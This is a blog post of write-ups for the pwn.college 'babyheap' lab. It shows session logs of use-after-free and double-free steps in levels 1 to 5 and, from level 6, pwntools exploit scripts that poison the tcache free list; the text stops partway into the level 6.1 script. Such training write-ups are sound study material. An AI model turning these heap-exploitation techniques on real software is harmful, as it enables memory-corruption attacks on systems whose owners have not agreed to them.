<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='以前跟着大佬们卷的，补发一下'><title>pwn.college babyheap writeups</title>

<link rel='canonical' href='/post/pwn-college-babyheap/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='pwn.college babyheap writeups'>
<meta property='og:description' content='以前跟着大佬们卷的，补发一下'>
<meta property='og:url' content='/post/pwn-college-babyheap/'>
<meta property='og:site_name' content='s0uthwood&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Pwn' /><meta property='article:tag' content='Labs' /><meta property='article:published_time' content='2023-04-13T00:04:31&#43;08:00'/><meta property='article:modified_time' content='2023-04-13T00:04:31&#43;08:00'/><meta property='og:image' content='/post/pwn-college-babyheap/cover.jpg' />
<meta name="twitter:title" content="pwn.college babyheap writeups">
<meta name="twitter:description" content="以前跟着大佬们卷的，补发一下"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='/post/pwn-college-babyheap/cover.jpg' />
    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/post/pwn-college-babyheap/">
                <img src="/post/pwn-college-babyheap/cover_huf2fe22ae908b49e1a5abbaf47203fa50_1437024_800x0_resize_q75_box.jpg"
                        srcset="/post/pwn-college-babyheap/cover_huf2fe22ae908b49e1a5abbaf47203fa50_1437024_800x0_resize_q75_box.jpg 800w, /post/pwn-college-babyheap/cover_huf2fe22ae908b49e1a5abbaf47203fa50_1437024_1600x0_resize_q75_box.jpg 1600w"
                        width="800" 
                        height="450" 
                        loading="lazy"
                        alt="Featured image of post pwn.college babyheap writeups" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/labs/" >
                Labs
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/post/pwn-college-babyheap/">pwn.college babyheap writeups</a>
    </h2>

    
    <h3 class="article-subtitle">
        以前跟着大佬们卷的，补发一下
    </h3>
    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Apr 13, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-pencil" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#9e9e9e" fill="none" stroke-linecap="round" stroke-linejoin="round">
    <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
    <path d="M4 20h4L18.5 9.5a1.5 1.5.0 00-4-4L4 16v4"></path>
    <line x1="13.5" y1="6.5" x2="17.5" y2="10.5"></line>
</svg>
                <time class="article-words">
                    4747 words
                </time>
            </div>
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    23 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <p>主要的考点是 tcache</p>
<h2 id="level-10">level 1.0</h2>
<pre tabindex="0"><code>###
### Welcome to ./babyheap_level1.0!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 550

[*] allocations[0] = malloc(550)
[*] allocations[0] = 0x55706c8782c0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #33     | SIZE: 537 - 552        | COUNT: 1     | HEAD: 0x55706c8782c0       | KEY: 0x55706c878010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x55706c8782c0      | 0                   | 0x231 (P)                    | (nil)               | 0x55706c878010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(549)
[*] flag_buffer = 0x55706c8782c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{sXzcRK81q3sHIwl38lZVQGny6xH.QXxczMsMTNzIzW}
</code></pre><h2 id="level-11">level 1.1</h2>
<pre tabindex="0"><code>###
### Welcome to ./babyheap_level1.1!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 632


[*] Function (malloc/free/puts/read_flag/quit): free


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): puts

Data: pwn.college{08aFymkc6E-dadmP3lmqL4h46Ae.QXyczMsMTNzIzW}
</code></pre><h2 id="level-20">level 2.0</h2>
<pre tabindex="0"><code>###
### Welcome to ./babyheap_level2.0!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 1000

[*] allocations[0] = malloc(1000)
[*] allocations[0] = 0x560b1d3492c0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #61     | SIZE: 985 - 1000       | COUNT: 1     | HEAD: 0x560b1d3492c0       | KEY: 0x560b1d349010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x560b1d3492c0      | 0                   | 0x3f1 (P)                    | (nil)               | 0x560b1d349010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(995)
[*] flag_buffer = 0x560b1d3492c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{k3MnR15WwkTvU1RT92hBSI_wI9k.QXzczMsMTNzIzW}
</code></pre><h2 id="level-21">level 2.1</h2>
<pre tabindex="0"><code>###
### Welcome to ./babyheap_level2.1!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 4096

[*] allocations[0] = 0x563907d252a0

[*] Function (malloc/free/puts/read_flag/quit): free


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = 0x563907d252a0

[*] Function (malloc/free/puts/read_flag/quit): puts

Data: pwn.college{k05fGVS5Pf68AmUislQgpldZWfl.QX0czMsMTNzIzW}
</code></pre><h2 id="level-30">level 3.0</h2>
<pre tabindex="0"><code>###
### Welcome to ./babyheap_level3.0!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 0

Size: 986

[*] allocations[0] = malloc(986)
[*] allocations[0] = 0x55fa293ad2c0

[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 1

Size: 986

[*] allocations[1] = malloc(986)
[*] allocations[1] = 0x55fa293ad6b0

[*] Function (malloc/free/puts/read_flag/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #61     | SIZE: 985 - 1000       | COUNT: 1     | HEAD: 0x55fa293ad2c0       | KEY: 0x55fa293ad010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x55fa293ad2c0      | 0                   | 0x3f1 (P)                    | (nil)               | 0x55fa293ad010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 1

[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #61     | SIZE: 985 - 1000       | COUNT: 2     | HEAD: 0x55fa293ad6b0       | KEY: 0x55fa293ad010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x55fa293ad6b0      | 0                   | 0x3f1 (P)                    | 0x55fa293ad2c0      | 0x55fa293ad010      |
| 0x55fa293ad2c0      | 0                   | 0x3f1 (P)                    | (nil)               | 0x55fa293ad010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(986)
[*] flag_buffer = 0x55fa293ad6b0
[*] flag_buffer = malloc(986)
[*] flag_buffer = 0x55fa293ad2c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

Index: 0

[*] puts(allocations[0])
Data: pwn.college{kBgocrg9tlQNBEi7F7cY3_pM8g7.QX1czMsMTNzIzW}
</code></pre><h2 id="level-31">level 3.1</h2>
<pre tabindex="0"><code>###
### Welcome to ./babyheap_level3.1!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 0

Size: 715


[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 1

Size: 715


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 0


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 1


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): puts

Index: 0

Data: pwn.college{8NS8mH365PxO43nF91eLslw4147.QX2czMsMTNzIzW}
</code></pre><h2 id="level-40">level 4.0</h2>
<pre tabindex="0"><code>###
### Welcome to ./babyheap_level4.0!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/scanf/read_flag/quit): malloc

Size: 934

[*] allocations[0] = malloc(934)
[*] allocations[0] = 0x557c8e2fc2c0

[*] Function (malloc/free/puts/scanf/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #57     | SIZE: 921 - 936        | COUNT: 1     | HEAD: 0x557c8e2fc2c0       | KEY: 0x557c8e2fc010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x557c8e2fc2c0      | 0                   | 0x3b1 (P)                    | (nil)               | 0x557c8e2fc010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/read_flag/quit): scanf

[*] scanf(&#34;%936s&#34;, allocations[0])
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

+====================+========================+==============+============================+============================+
| TCACHE BIN #57     | SIZE: 921 - 936        | COUNT: 1     | HEAD: 0x557c8e2fc2c0       | KEY: 0x557c8e2fc010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x557c8e2fc2c0      | 0                   | 0x3b1 (P)                    | 0x6161616161616161  | 0x6161616161616161  |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #57     | SIZE: 921 - 936        | COUNT: 2     | HEAD: 0x557c8e2fc2c0       | KEY: 0x557c8e2fc010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x557c8e2fc2c0      | 0                   | 0x3b1 (P)                    | 0x557c8e2fc2c0      | 0x557c8e2fc010      |
| 0x557c8e2fc2c0      | 0                   | 0x3b1 (P)                    | 0x557c8e2fc2c0      | 0x557c8e2fc010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/read_flag/quit): read_flag

[*] flag_buffer = malloc(934)
[*] flag_buffer = 0x557c8e2fc2c0
[*] flag_buffer = malloc(934)
[*] flag_buffer = 0x557c8e2fc2c0
[*] read the flag!

[*] Function (malloc/free/puts/scanf/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{k0PafnMxipXAkPh40z9lBS0Royt.QX3czMsMTNzIzW}
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</code></pre><h2 id="level-41">level 4.1</h2>
<pre tabindex="0"><code>###
### Welcome to ./babyheap_level4.1!
###


[*] Function (malloc/free/puts/scanf/read_flag/quit): malloc

Size: 208


[*] Function (malloc/free/puts/scanf/read_flag/quit): free


[*] Function (malloc/free/puts/scanf/read_flag/quit): scanf

aaaaaaaaaaaaaaaa


[*] Function (malloc/free/puts/scanf/read_flag/quit): free


[*] Function (malloc/free/puts/scanf/read_flag/quit): read_flag


[*] Function (malloc/free/puts/scanf/read_flag/quit): puts

Data: pwn.college{M8JQ-P-E8LzRrm6S5LkH-_W1pSV.QX4czMsMTNzIzW}
</code></pre><h2 id="level-50">level 5.0</h2>
<pre tabindex="0"><code>###
### Welcome to ./babyheap_level5.0!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 0

Size: 680

[*] allocations[0] = malloc(680)
[*] allocations[0] = 0x55f177e302c0

[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 1

Size: 680

[*] allocations[1] = malloc(680)
[*] allocations[1] = 0x55f177e30570

[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #41     | SIZE: 665 - 680        | COUNT: 1     | HEAD: 0x55f177e302c0       | KEY: 0x55f177e30010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x55f177e302c0      | 0                   | 0x2b1 (P)                    | (nil)               | 0x55f177e30010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 1

[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #41     | SIZE: 665 - 680        | COUNT: 2     | HEAD: 0x55f177e30570       | KEY: 0x55f177e30010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x55f177e30570      | 0                   | 0x2b1 (P)                    | 0x55f177e302c0      | 0x55f177e30010      |
| 0x55f177e302c0      | 0                   | 0x2b1 (P)                    | (nil)               | 0x55f177e30010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag

[*] flag_buffer = malloc(680)
[*] flag_buffer = 0x55f177e30570
[*] read the flag!
+====================+========================+==============+============================+============================+
| TCACHE BIN #41     | SIZE: 665 - 680        | COUNT: 1     | HEAD: 0x55f177e302c0       | KEY: 0x55f177e30010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x55f177e302c0      | 0                   | 0x2b1 (P)                    | (nil)               | 0x55f177e30010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 1

[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #41     | SIZE: 665 - 680        | COUNT: 2     | HEAD: 0x55f177e30570       | KEY: 0x55f177e30010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x55f177e30570      | 0                   | 0x2b1 (P)                    | 0x55f177e302c0      | 0x55f177e30010      |
| 0x55f177e302c0      | 0                   | 0x2b1 (P)                    | (nil)               | 0x55f177e30010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): puts_flag

pwn.college{Al0dWDcTQSPHRTviMmn0DtuwAto.QX5czMsMTNzIzW}

+====================+========================+==============+============================+============================+
| TCACHE BIN #41     | SIZE: 665 - 680        | COUNT: 2     | HEAD: 0x55f177e30570       | KEY: 0x55f177e30010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x55f177e30570      | 0                   | 0x2b1 (P)                    | 0x55f177e302c0      | 0x55f177e30010      |
| 0x55f177e302c0      | 0                   | 0x2b1 (P)                    | (nil)               | 0x55f177e30010      |
+----------------------------------------------------------------------------------------------------------------------+
</code></pre><h2 id="level-51">level 5.1</h2>
<pre tabindex="0"><code>###
### Welcome to ./babyheap_level5.1!
###


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 0

Size: 616


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 1

Size: 616


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 0


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 1


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 1


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): puts_flag

pwn.college{QmwcttjLtWqnKnPTk6flBRw-oN6.QXwgzMsMTNzIzW}
</code></pre><h2 id="level-60">level 6.0</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;])</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level6.0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x42584d</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> puts(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>send_flag(p, key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Authorized!</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># You win! Here is your flag:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwn.college{YRhfRyKOQedyIU9XwWzrQiXDrMP.QXxgzMsMTNzIzW}</span>
</span></span></code></pre></div><h2 id="level-61">level 6.1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
